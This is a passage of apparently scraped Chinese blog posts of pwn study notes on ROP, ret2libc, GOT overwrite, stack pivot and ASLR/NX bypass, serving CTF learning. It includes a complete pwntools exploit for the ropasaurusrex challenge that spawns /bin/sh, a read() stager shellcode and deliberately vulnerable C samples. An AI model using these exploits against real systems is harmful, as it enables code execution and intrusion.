&#x3D;&#x3D; &#39;d&#39;: execute &#x3D; &quot;&quot;&quot; # set environment LD_PRELOAD&#x3D; #b *&#123;0&#125; #b *0x8048afa ignore 2 0x0a c &quot;&quot;&quot;.format(hex(elf.symbols[&#39;main&#39;] if &#39;main&#39; in elf.symbols.keys() else elf.entrypoint)) conn &#x3D; gdb.debug([&#39;.&#x2F;babyfirst-heap&#39;], execute&#x3D;execute)else: conn &#x3D; process([&#39;.&#x2F;babyfirst-heap&#39;])# conn &#x3D; process([&#39;.&#x2F;heap&#39;], env&#x3D;&#123;&#39;LD_PRELOAD&#39;: &#39;&#39;&#125;)# preparing for exploitationlog.info(&#39;Pwning&#39;)payload &#x3D; &quot;&quot;conn.sendline(payload)conn.interactive() pwntools使用方法参见官方文档及其他公开资料 信息收集 编写exploit之前需要先收集二进制地址等信息 可以使用各种命令来收集信息 调查各种PLT/GOT $ objdump -d -M intel ropasaurusrex | grep &quot;@plt&gt;:&quot; -A1 pop×N gadget 调查 123$ gdb .&#x2F;ropasaurusrex –qgdb-peda $ startgdb-peda $ ropgadget 地址固定的RW区域(.data)调查 $ readelf -S ropasaurusrex | fgrep .data libc中的system偏移 $ ldd ropasaurusrex (首先获取使用的libc路径) $ objdump -d /lib/i386-linux-gnu/libc.so.6 | grep &quot;system&quot; (在对应libc中调查) 12345678## 组合攻击流1. 通过write泄漏某处GOT的地址 将write(STDOUT, got_write, 4)加载到stack上2. 通过泄漏的地址计算出system@libc的地址 libc_base = u(f.read(4)) - offset_write libc_system = libc_base + offset_system 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647483. 在某处生成字符串&quot;&#x2F;bin&#x2F;sh\\0&quot; 将read(STDIN, .data, 8)加载到stack上4. 将某个GOT重写为system@libc 将read(STDIN, got_write, 4)加载到stack上5. 使用参数&quot;&#x2F;bin&#x2F;sh&quot;调用被修改GOT的函数 将write(.data)加载到stack上，这等价于system(&quot;&#x2F;bin&#x2F;sh&quot;)也就是说，整个流程要加载到stack伤的数据如下：![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041801.jpg)- 发送这段数据，会调用plt_write() ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041802.jpg)- 通过plt_write()泄漏地址，攻击者可以获取4个字节 ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041803.jpg)- 根据获取的数据计算出system的地址 ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041804.jpg)- 因为二进制程序正在等待数据读取，首先准备&quot;&#x2F;bin&#x2F;sh&quot; ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041805.jpg)- 再次读取，使用计算出的system地址重写write@got ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041806.jpg)- 通过GOT Overwrite使得write&#x3D;system，之后调用write(.data) ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041807.jpg)- 实际调用的是system(&quot;&#x2F;bin&#x2F;sh&quot;)，getshell ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041808.jpg)## exploit最终完整exploit代码如下： #!/usr/bin/python # -*- coding: utf-8 -*- from pwn import * context(os=’linux’, arch=’i386’) context.log_level = ‘debug’ # output verbose logRHOST = “localhost”RPORT = 1025LHOST = “127.0.0.1”LPORT = 1025 libc = ELF(‘’)elf = ELF(‘./ropasaurusrex’) def section_addr(name, elf=elf): return elf.get_section_by_name(name).header[‘sh_addr’] conn = Noneif len(sys.argv) &gt; 1: if sys.argv[1] == ‘r’: conn = remote(RHOST, RPORT) elif sys.argv[1] == ‘l’: conn = remote(LHOST, LPORT) if &apos;main&apos; in elf.symbols.keys() else elf.entrypoint)) conn = gdb.debug([&apos;./ropasaurusrex&apos;], execute=execute)else: conn = process([‘./ropasaurusrex’]) preparing for exploitationwrite_plt = 0x0804830cread_plt = 0x0804832cpop3ret = 0x80484b6write_got = 0x8049614read_got = 0x804961cdata = 0x08049620system_offset = 0x0003d200write_offset = 0x000e6d80 log.info(‘Pwning’) buf = ‘A’ * 140 write(STDOUT, got_write, 4)buf += p32(write_plt) + p32(pop3ret) + p32(1) + p32(write_got) + p32(4) read(STDIN, data, 8)buf += p32(read_plt) + p32(pop3ret) + p32(0) +p32(data) + p32(8) read(STDIN, got_write, 4)buf += p32(read_plt) + p32(pop3ret) + p32(0) + p32(write_got) + p32(4) write(data) # system(“/bin/sh”)buf += p32(write_plt) + p32(0xdeadbeef) + p32(data) conn.sendline(buf)ret = u32(conn.recv())print(‘write@got: {}’.format(hex(ret)))print(‘libc_start: {}’.format(hex(ret - write_offset)))system_addr = ret - write_offset + system_offsetprint(‘system: {}’.format(hex(system_addr))) conn.send(‘/bin/sh’+’\\x00’) buf = p32(system_addr)conn.send(buf) conn.interactive() 按照上述动态调试环境测试运行，pwned： {% image https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041901.jpg 'img' '' %}","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记14:stack pivot与Off-by-one","slug":"Pwn学习笔记14-stack-pivot与Off-by-one","date":"2019-04-15T05:56:33.000Z","updated":"2019-04-15T06:00:05.310Z","comments":true,"path":"2019/04/15/Pwn学习笔记14-stack-pivot与Off-by-one/","link":"","permalink":"https://darkwing.moe/2019/04/15/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B014-stack-pivot%E4%B8%8EOff-by-one/","excerpt":"","text":"ROP的问题点ROP需要一个较大的溢出缓冲区 因为只包含一些细分的小指令，要发送的数据不可避免的增加 如果在srack返回地址下没有较大的溢出，就会很糟糕 如果没有足够的溢出缓冲区该怎么办？ stack pivot 溢出量问题绕过 - stack pivot stack pivot 使用ret2plt等将后续ROP加载到bss(适当区域) 通过pop ebp; ret来调整EBP寄存器 通过leave; ret来任意更改ESP leave是「mov esp, ebp; pop ebp」之类的值 bss作为stack继续ROP stack pivot的注意事项 使用bss作为stack发动ROP，可能会失败 调用system()之前出现SIGSEGV 调用system()时也可能出现SIGSEGV 这是因为(后续ROP使用的GOT等)必要的变量被破坏，以及跳到stack等原因 因为read/write时，系统内的dl_fixup函数对stack做了很好的保护 pivot使用的stack，应该设置在.bss的中间，而不是靠近顶部 建议使用bss+0x800左右的区域 Off-by-one 栈溢出 栈溢出的椅子红，但只溢出一个字节 只可能覆盖Old-EBP的低位一个字节 这里也能使用stack pivot 因为可以更改Old-EBP，因此可以在这个函数返回后控制ebp 另外，当从那里返回时，可以更改stack伤的返回地址 只要函数使用leave或者等效的命令 由于stack地址根据环境而变化，因此很难完全预测一字节的溢出值 但总共可以使用256次 目前为止的技术总结 技术 推荐练习的问题 nop-sled CodeGate 2013 - pwn100 brute force CodeGate 2013 - pwn100 ret2esp CSAW CTF 2012 - pwn300 - 4842 stager Hack.lu CTF 2012 - pwn300 - braincpy ret2plt Plaid CTF 2013 - pwn200 - ropasaurusrex ret2pop Plaid CTF 2013 - pwn200 - ropasaurusrex ret2libc Plaid CTF 2013 - pwn200 - ropasaurusrex GOT overwrite Plaid CTF 2013 - pwn200 - ropasaurusrex ROP Hack.lu CTF 2012 - pwn300 – braincpy stack pivot Hack.lu CTF 2012 - pwn300 – braincpy","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记13:ROP与DROP","slug":"Pwn学习笔记13-ROP与DROP","date":"2019-04-12T06:58:54.000Z","updated":"2019-04-12T06:59:23.041Z","comments":true,"path":"2019/04/12/Pwn学习笔记13-ROP与DROP/","link":"","permalink":"https://darkwing.moe/2019/04/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B013-ROP%E4%B8%8EDROP/","excerpt":"","text":"ASLR绕过 - 方式2在ASLR中，并非所有地址都是随机的 也可以利用.text区域 NX+ASLR绕过2 - ROPROP(Return Oriented Programming) 狭义：想要执行的代码细分后在.text区域搜索合并 RX权限，即能够执行的只有.text区域，因此想办法使用.text区域 广义：除了狭义的ROP之外，也包括ret2plt/ret2libc之类的伪造返回地址的方法 细分的代码叫做gadget，rop gadget 例如下面的代码，可以对eax进行+1操作 寻找rop gadget很多工具，例如ROPgadget img 其他工具例如msfrop，rp++，Ropeme，ropper NX+ASLR绕过3 - DROPDROP(Dynamic ROP) .text区域的gadget很少时的情况 基于泄漏的libc地址，使用libc中的gadget构造ROP 因为libc相对比较大，其中的gadget非常多 在泄漏libc地址的大部分情况中非常有效 前提是指导目标环境的libc版本","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记12:ASLR与memory leak","slug":"Pwn学习笔记12-ASLR与memory-leak","date":"2019-04-12T06:21:27.000Z","updated":"2019-04-12T06:22:10.378Z","comments":true,"path":"2019/04/12/Pwn学习笔记12-ASLR与memory-leak/","link":"","permalink":"https://darkwing.moe/2019/04/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B012-ASLR%E4%B8%8Ememory-leak/","excerpt":"","text":"ret2libc对策 – ASLRASLR(Address Space Layout Randomization) 主要是地址随机化 现代Linux内核中默认开启 ret2libc成功的原因是，libc之类的读取地址是固定的 因此如果每次运行时，libc之类的地址随机，是一个比较好的方式 miao# echo 2 &gt; /proc/sys/kernel/randomize_va_space miao# ldd stack6 | grep libc libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d94000) miao# ldd stack6 | grep libc libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7dd4000) 如上所示，每次运行地址都不同 ASLR绕过 - 方式1ASLR中，并非所有地址都是随机的 PLT/GOT之类的地址是固定的，可以利用这一点 实际的内存映射大概是这样 红框中是固定地址，PLT和GOT在这里 GOT中存储ASLR随机化后的地址 因此出现了有名的的根据这些信息计算libc地址的方法 GOT leak GOT中包含重要地址 printf的外部地址 如果能够读取更新后的(printf@got.plt)这个值，那么就可能计算出libc.so的加载地址 GOT overwrite 因为GOT位于RW区域，因此可能覆写 使用某种漏洞将printf的GOT替换为另一个地址 默认情况下可以重写GOT的值。通过某种方式将其修改为其他函数的地址，当调用printf函数的时候会调用修改后的其他函数。这种方式叫做GOT overwrite。 NX+ASLR绕过1 – memory leak + ret2plt + GOT overwrite 假设存在栈溢出 通过ret2plt等方式，显示出printf@got的地址(write) 泄漏地址 攻击者可以通过泄漏的地址计算libc的基地址，加上偏移量计算出system的地址 通过ret2plt等方式，向printf@got读入system的地址(read) 下次调用printf的时候，会实际调用system 其他的泄漏除GOT leak之外，其他能够泄漏libc地址的情况 通过(Stack/Heap)缓冲区溢出读取造成的泄漏 无序参考，负数索引，类型(主要是结构体)的混淆导致的泄漏 字符串末尾无终止字符造成的泄漏 格式化字符串问题 Use After Free，Double Free 条件竞争等 通过泄漏想要获取的值 stack区域上__libc_start_main的返回地址 指向bss区域中与libc相关的变量的指针（例如FILE *之类的） 指向堆管理区域(元数据)中的bin/fastbins的指针 bin/fastbins无任何连接时适用 与libc相关的所有其他地址 其他的指针GOT之外其他可写的函数指针 C++ class的vtable 在C++中，class有method，在内部实现了一个函数指针表 .fini_array(旧的.dtor区域) gcc编译具有__attribute__((destructor))的函数时,会在这里注册 由atexit()注册的列表 明确指定析构函数时的函数指针 但是它与Thread Local Storage中奇怪的值XOR(PTR_MANGLE)之后进行注册","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记11:ret2libc","slug":"Pwn学习笔记11-ret2libc","date":"2019-04-09T06:40:26.000Z","updated":"2019-04-09T06:41:11.055Z","comments":true,"path":"2019/04/09/Pwn学习笔记11-ret2libc/","link":"","permalink":"https://darkwing.moe/2019/04/09/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011-ret2libc/","excerpt":"","text":"ret2plt链的问题点 如果想要使用的函数不在PLT中，则无法构成链 ret2libc img 绕过NX2 - ret2libc想要使用的函数不在PLT时，应该怎么办？ 源代码中未使用的函数，在二进制程序中不会有PLT入口 也就是说，我们无法通过PLT代理到函数地址 即使没有PLT入口，但如果内存地址正确，也可以直接调用函数(至少libc中的函数可以这样) 如果能够知道system函数的地址，那么就能够调用它 怎样才能知道地址？ 首先，了解下ASLR miao# echo 0 &gt; /proc/sys/kernel/randomize_va_space miao# ldd heap | grep libc.so libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7dda000) miao# ldd heap | grep libc.so libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7dda000) miao# echo 2 &gt; /proc/sys/kernel/randomize_va_space miao# ldd heap | grep libc.so libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d45000) miao# ldd heap | grep libc.so libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d8e000) miao# 在ASLR关闭的情况下，无论运行多少次，读取到的目标地址都是不变的(这里练习环境关闭了ASLR) 对于不同的环境和二进制文件，该地址可能不同，但大体上相似(0xf7XXXXXX这种) 但是，32位机器上的结果和在64位机器上运行32位程序的结果不同 32位机器，0xb7XXXXXX 64位机器运行32位程序，0xf7XXXXXX 这是因为64位机器中内核区域的映射地址不是0xc0000000~(大概) libc.so中的偏移地址，在文件中和内存中都是固定的 libc.so的文件内容以完全相同的方式映射到内存 也就是说，我们只需要加上基地址 因此 使用objdump预先检查函数的偏移量 例如，system()的偏移是0x40190，如果对方的libc与自己的libc一致，那么内存中的地址就是0xf7e21000 + 0x40190 但是，如果环境不同，可能会有轻微的区别 检查libc中的函数地址 # ldd heap (首先检查正在使用的libc路径) objdump -d /lib/i386-linux-gnu/libc.so.6 | grep &quot;system&quot; (检查这个libc) 检查libc中特定字符串的地址 strings -tx /lib/i386-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot; 预先检查得到了system()和”/bin/sh”的地址，将他们加载到stack中 “/bin/sh”类似的字符串也在libc.so中 如果环境不同，可能会有偏差 但是，即使环境不同，加载目标地址也只会以0x1000的增量变化 您可以以0x1000为增量进行暴力枚举 0xf7e61190, 0xf7e62190, 0xf7e63190, … 那么，问题来了 对方环境必须要是特定的libc 需要提前调查各种偏移地址 这考察了侦察能力 需要识别对方环境具体事什么版本的libc 目前为止的技术总结 技术 推荐练习的问题 nop-sled CodeGate 2013 - pwn100 brute force CodeGate 2013 - pwn100 ret2esp CSAW CTF 2012 - pwn300 - 4842 stager Hack.lu CTF 2012 - pwn300 - braincpy ret2plt Plaid CTF 2013 - pwn200 - ropasaurusrex ret2pop Plaid CTF 2013 - pwn200 - ropasaurusrex ret2libc Plaid CTF 2013 - pwn200 - ropasaurusrex","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"MacOS下编译使用php_mt_seed","slug":"MacOS下编译使用php-mt-seed","date":"2019-04-09T03:17:47.000Z","updated":"2019-04-09T03:32:08.556Z","comments":true,"path":"2019/04/09/MacOS下编译使用php-mt-seed/","link":"","permalink":"https://darkwing.moe/2019/04/09/MacOS%E4%B8%8B%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8php-mt-seed/","excerpt":"","text":"下载源码包https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz 编译直接编译会报错，缺少openmp 可以去掉这个选项编译，但这样会只能单核跑： 安装llvm和libomp： brew install llvm libomp 之后使用llvm的clang进行编译，报错： 这是因为macOS SDK headers不在/usr/include里，可以使用 1open &#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#x2F;Packages&#x2F;macOS_SDK_headers_for_macOS_10.14.pkg 将其安装到默认/usr/include里 之后继续编译，提示一个warning编译选项，加了之后反而不能用： 默认编译选项就可以：","categories":[],"tags":[]},{"title":"Pwn学习笔记10:PLT,GOT与ret2plt","slug":"Pwn学习笔记10-PLT-GOT与ret2plt","date":"2019-04-03T07:14:34.000Z","updated":"2019-04-08T01:30:35.095Z","comments":true,"path":"2019/04/03/Pwn学习笔记10-PLT-GOT与ret2plt/","link":"","permalink":"https://darkwing.moe/2019/04/03/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010-PLT-GOT%E4%B8%8Eret2plt/","excerpt":"","text":"PLT与GOTPLT(Procedure Linkage Table)与GOT(Global Offset Table) ELF文件调用库函数时，存在PLT入口和GOT入口 注意，静态链接库没有这些 是一种在libc.so等动态查找外部函数地址的机制 PLT解析外部地址，之后保存(缓存)在GOT中 如果有PLT入口，就可以在不知道函数实际地址的情况下去调用它 PLT作为代理跳转到真实地址 PLT中的实体是汇编代码，作为缓冲函数存在 什么时候存在PLT？ 函数的PLT入口存在的条件是，在预编译代码中使用该函数 某些情况下，gcc优化或者FORTIFY_SOURCE会变更函数，这里暂不考虑 也就是说，经常使用的printf存在PLT入口 PLT在ELF中的固定地址 即使开启ASLR，地址也是固定的 但是，如果PIE也开启，它会变化 如果有PLT入口，就能够进行ret2plt 可以通过objdump，readelf等检查PLT/GOT入口的地址（以下是示例）objdump -d -M intel stack3 | grep &quot;@plt&gt;:&quot; -A1 左边是PLT，右边是GOT ret2plt, ret2popret2plt 如果PLT与参数，返回地址等一起加载于stack上，则无法与正常的函数调用区分开 PLT不会检查调用来源 例如使用mmap的PLT，获取具有RWX权限的内存(假设存在mmap@plt) void*mmap(void*addr,size_tlength,intprot,intflags,intfd,off_toffset); 但是，这并不能读取额外的内容 我们想在mmap之后执行read(也就是说想要多次调用函数) ret2pop 使用pop从stack中除去参数 pop = 从stack中取出一个元素(4个字节)，存放在寄存器中 stack减小(=esp指向的地址增大) 代码中pop×N;找到ret(也可以用add esp，同样N次) 像这个例子，pop6次，称为p6ret, pop6ret等 NX绕过方式1 - ret2plt链 熟练使用ret2pop，可以构造出ret2plt链 例如 使用mmap在合适的固定地址获取RWX内存 对该区域使用read()读入shellcode 返回到该区域执行shellcode 按照mmap -&gt; read -&gt; shellcode的调用顺序 并不是直接执行shellcode 换句话说，这也是一种Stager ret2plt - 信息收集方法 对于”pop×N; ret”地址的查找，可以使用gdb-peda秒杀 使用gdb读取该二进制程序 start(或者run)，然后输入ropgadget 例如pop4ret是这样的命令列表，确实是4个pop之后ret 目前为止的技术总结 技术 推荐练习的问题 nop-sled CodeGate 2013 - pwn100 brute force CodeGate 2013 - pwn100 ret2esp CSAW CTF 2012 - pwn300 - 4842 stager Hack.lu CTF 2012 - pwn300 - braincpy ret2plt Plaid CTF 2013 - pwn200 - ropasaurusrex ret2pop Plaid CTF 2013 - pwn200 - ropasaurusrex","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记9:栈溢出及NX","slug":"Pwn学习笔记9-栈溢出及NX","date":"2019-04-02T06:44:47.000Z","updated":"2019-04-02T06:46:00.268Z","comments":true,"path":"2019/04/02/Pwn学习笔记9-栈溢出及NX/","link":"","permalink":"https://darkwing.moe/2019/04/02/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8ANX/","excerpt":"","text":"漏洞类型及攻略方法全写出来不太可能，图示大概这样： Stack以x86环境为例 每个进程在内存区域底部都有一个stack 上半部分是在32位机器中运行32位程序 下半部分是在64位机器中运行32位程序 它与C语言函数密切相关12345678910int main(void)&#123; int a, b; .. func(a, b); .. return 0; &#125;void func(int a, int b)&#123; int x, y; ..&#125; 例如，调用这个函数时stack状态如下： ESP/EBP不容易理解，这里解释一下 ESP寄存器始终指向栈顶 EBP寄存器始终指向栈底 EBP-0x8能偶访问本地变量2 EBP-0x4能够访问本地变量1 EBP+0x8能够访问参数1 EBP+0xC能够访问参数2 调用原函数也有相同的帧并保存EBP寄存器，当函数被调用时，EBP会以新的帧为基础更新。因此，调用原函数的帧暂时保存到stack中 栈溢出对策及解决方法 首先来看经典问题 曾经，stack和heap都是有X权限的 BOF:buffer overflow 写入数据超出区域 覆盖写入后续区域 例如这段代码： int main(void){ int a, b; .. func(a, b); .. return 0; } void func(int a, int b){ char buf1[4]; char buf2[4]; strcpy(buf2,&quot;AAAABBBB&quot;); } 123456789101112 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040108.jpg)- 如果用户可以输入任意值，会发生什么？ - 如果没有size限制，就可以任意进行覆盖 - 甚至可以指定返回地址 - 例如这段代码： - int main(void){ int a; char s[256]; .. read(stdin, s, 256); func(a, s); .. return 0; } void func(int a, char* s){ char buf1[4]; char buf2[4]; strcpy(buf2, s); } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040109.jpg)- 添加shellcode - 如果Evil Return addr指向shellcode - 那么返回前会执行shellcode并执行shell(&#x2F;bin&#x2F;sh) - 可以执行任意代码 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040110.jpg)## 1-猜测地址- stack地址是动态的，取决于环境 - 如何让它到达shellcode ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040111.jpg)- 可以略微转移 - nop-sled - nop &#x3D; 0x90(空指令) - 尽可能多的拼接 - 如果到达nop-sled的某个地方，shellcode将自动执行- 多次尝试 - brute force - 如果不知道地址，那么可以尝试所有的可能 - 结合使用nop-sled可以减少尝试次数 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040112.jpg)## 2-溢出量的问题- 考虑不能过多溢出的情况 - nop-sled无法准备好(或者太短了) - 不能猜测地址- brute force需要太长时间 - 如果运气好的话，能够执行shellcode - 实践中很少会成功 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040201.jpg)- 使用保存栈地址的ESP比较好- ret2esp - 但是，如果代码中没有jmp esp或者call esp就很糟糕 - 实际上很可能找不到 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040202.jpg)## 3-溢出量的问题- 只能够少量溢出的情况 - nop-sled无法构造 - 甚至连填充shellcode都不够 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040203.jpg)- 可以使用较短的代码来读取后面更多内容 - Stager - 通过溢出写入较短的汇编代码 - 先运行这部分代码，读取其他shellcode - 通过读取的内容来控制程序运行流程 - 具体大概像这样( 只有17个byte)： - push byte 0x3 ; eax = NR_read pop eax push byte 0x4 ; ebx = fd pop ebx push byte 0xff; edx = size pop edx call next next: pop ecx ; ecx = buf(=ret_addr) int 0x80 ; read(fd, buf, size) stager的优点 使用Shellcode时，目的是首先执行Stager 如果Stager移动，Shellcode也会移动 因为它很短，很容易绕过限制 可以轻松更改后续shellcode 对策 - Stack不可执行(NX)如果stack和heap不能执行就太好了 这就是NX(No eXecute / Never eXecute) 有各种实现，例如NX比特位，PaX，Exec Shield(Redhat)等 硬件实现或软件实现 结果都是让stack之类不可执行 考虑绕过NX 该怎么做 (例)创建可写的固定地址，编写shellcode并执行 通过mmap或者mprotect获取RWX权限的内存区域 在那里写入shellcode并返回 问题点 如何调用到mmap/mprotect？ 通过溢出如何写入到那里 溢出是在栈向下写入的攻击 不能够反向写入 ret2plt 让栈的状态，在函数调用的瞬间是相同的(非常重要的概念)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记:总结01","slug":"Pwn学习笔记-总结01","date":"2019-04-01T05:34:17.000Z","updated":"2019-04-01T05:35:20.660Z","comments":true,"path":"2019/04/01/Pwn学习笔记-总结01/","link":"","permalink":"https://darkwing.moe/2019/04/01/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%80%BB%E7%BB%9301/","excerpt":"","text":"总结 这一次，主要解决与堆密切相关的漏洞 还有很多其他类型的漏洞 例如栈溢出，很有名并且很容易找到 条件竞争，整数溢出这类稍微有点难找 简单介绍一下其他漏洞 其他类型的漏洞栈缓冲区溢出 当输入数据超出栈上分配的内存末尾时，会产生这种溢出 可以通过重写返回地址来控制后续操作 如果启用了canary保护，那么会检测到stack被更改 特别情况，仅能超出一个元素，被称为Off-By-One Stack Buffer Overflow。这种情况下只能重写ebp/rbp等，需要进行栈调整 堆缓冲区溢出 当输入的数据超出堆上分配的内存末尾时，会产生这种溢出 虽然不能重写返回地址，但是可以重写例如函数指针，数据等来控制后续操作 如果可以重写内存管理区域，则可以通过重写链表的next地址或者prev地址，向任意内存地址写入任意数据(之后会详细说明) 用户可控数据 这是导致溢出产生的现实原因，输入的数据由用户指定，而缓冲区是固定size，向固定size的缓冲区发送任意size的数据，就导致了溢出 这也能够导致Buffer Over Read 变更连接攻击(Unlink attack) 通过堆溢出，能够重写堆上的malloc管理数据(被称为chunk)，通过free()的时候进行unlink处理，就更改了next或者prev到能够RWX的任意内存，可以写入任意数据 还可以进行GOT Overwrite fastbins attack malloc/free时，可能进行fastbins attack malloc的返回地址能够任意指定，就产生了漏洞 字符串末尾NULL消除(Unterminated Null-Terminated String) C语言中的字符串是数组，如果没有结尾的NULL字符(=’\\0’)，那么在显示字符串时也会将后面的内容显示出来，造成信息泄漏 在这种情况下嘛，可以获得堆，栈，libc或者PIE的基地址，并且在某些情况下，可能泄漏例如用于加密/解密的密钥之类的重要信息 这可能是一个意外的长度，也会导致溢出 内存释放后的使用(Use After Free) 在malloc的内存被释放后，再次向该地址呢写入数据会发生这种情况 如果该地址已经被别的功能所使用，则可以重写改地址的数据 内存二次释放(Double Free) malloc申请的内存进行释放后，再次释放相同的地址 如果在第一次和第二次释放之间，这个地址被其他用途X获取到，那么第二次也会释放掉这个地址 那么，X在使用它时，堆中的数据可能会严重受损，因为它使用已经被释放的地址 类型混淆(Type Confusion) 在使用多种结构体/类的情况下，如果用户可以选择要应用的结构/类，错误的应用可能导致溢出及函数指针覆盖 格式化字符串漏洞(FSB: Format String Bug) 在printf系列函数中，如果使用printf(input)这类写法，攻击者就能够控制参数格式。正确的写法应该是printf(“%s”,input). 例如使用%p或者%x之类的转换说明符，可能泄漏stack上的值。即使是在ASLR/PIE环境下也可以置顶栈地址。 另外，如果用户输入在栈上，则可以输出该值地址，并以此为基础，向栈的内存地址写入数据 此外，%12345x这类指定字符宽度规范，可以自由指定printf输出的字符数。通过这个可能向任意内存地址写入任意值 覆盖stack或者GOT，重写数据或者函数指针，利用方式有很多 FORTIFY_SOURCE(使用printf_chk之类的chk)情况下，无法使用%n 基于堆的FSB 格式化字符串攻击困难，用户输入不在stack上的情况 使用原本存在于stack上的二重引用(A→B→C)的指针，通过A修改B的低字节，通过B修改C，… 类似这样的攻略方式 条件竞争(Race Condition) 当资源管理对于竞争的处理不正确时，会发生这种情况 对一个对象同时进行多个操作，可能会导致该对象的状态出现问题 例如，在多人共享数据的服务中，客户端A和B同时连接的情况下，B在A打开某个文件的时候对该文件进行删除操作，类似这种情况 在某些情况下，数据可能被破坏，Use After Free或者Double Free，或者是堆溢出或栈溢出 TOCTOU条件竞争(Time-of-check Time-of-use Race Condition) 在A和B两次操作之间，因为另一个操作改变了状态 例如A[检查文件属性(确认它不是符号链接)]，B[读取文件], 在A和B两次操作之间，文件被重写为符号链接，那么B将从符号链接读取内容 使用未初始化的数据(Using Uninitialized Variable) 使用之前已经被使用过的数据可能会导致意外操作 例如，申请的内存，未初始化的数据是”%p%p%p…”，如果未初始化直接使用printf将导致格式化字符串攻击之类的 负数处理问题 在条件比较情况中，没有正确考虑signed和unsigned的差异，从而将负数是别成大的正数的问题 